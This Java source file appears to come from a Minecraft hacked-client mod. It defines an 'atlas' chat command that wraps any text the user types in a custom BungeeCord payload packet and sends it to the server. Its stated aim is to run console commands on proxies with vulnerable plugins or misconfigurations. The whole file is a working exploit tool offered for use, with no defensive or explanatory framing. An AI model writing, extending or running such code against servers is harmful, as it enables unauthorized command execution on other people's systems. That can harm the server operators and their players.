package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;
import net.paradise_client.packet.BungeeCommandPacket;

import static com.mojang.brigadier.builder.RequiredArgumentBuilder.argument;

/**
 * BungeeConsoleExploitCommand -  Command for exploiting BungeeCord console command execution vulnerabilities.
 * 
 * This command sends custom payload packets that can execute console commands on the BungeeCord proxy
 * if the server has vulnerable plugins or misconfigurations.
 */
public class BungeeConsoleExploitCommand extends Command {

    private final MinecraftClient mc;

    /**
     * Constructs a new BungeeConsoleExploitCommand.
     * Initializes with the command name "atlas" and description.
     */
    public BungeeConsoleExploitCommand() {
        super("atlas", "Bungee console command sender exploit", true);
        this.mc = MinecraftClient.getInstance();
    }

    /**
     * Builds the command structure using Brigadier argument builder.
     * 
     * @param root The root literal argument builder to attach command nodes to
     */
    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
                // Show error message when command is incomplete (missing arguments)
                Helper.printChatMessage("Incomplete command!");
                return 1;
            })
            .then(argument("command", StringArgumentType.greedyString())
                .executes(this::executeCommand));
    }

    /**
     * Executes the BungeeCord console command exploit.
     * Creates and sends a custom payload packet containing the command to execute.
     * 
     * @param context The command context containing the parsed arguments
     * @return 1 indicating successful command execution
     */
    private int executeCommand(CommandContext<?> context) {
        // Extract the command argument (greedy string captures all remaining input)
        String command = context.getArgument("command", String.class);
        
        // Create custom payload packet with the BungeeCord command exploit
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(new BungeeCommandPacket(command));
        
        // Send the exploit packet to the server
        Helper.sendPacket(packet);
        
        // Notify the user that the payload was sent
        Helper.printChatMessage("Payload sent!");
        
        return 1;
    }
}
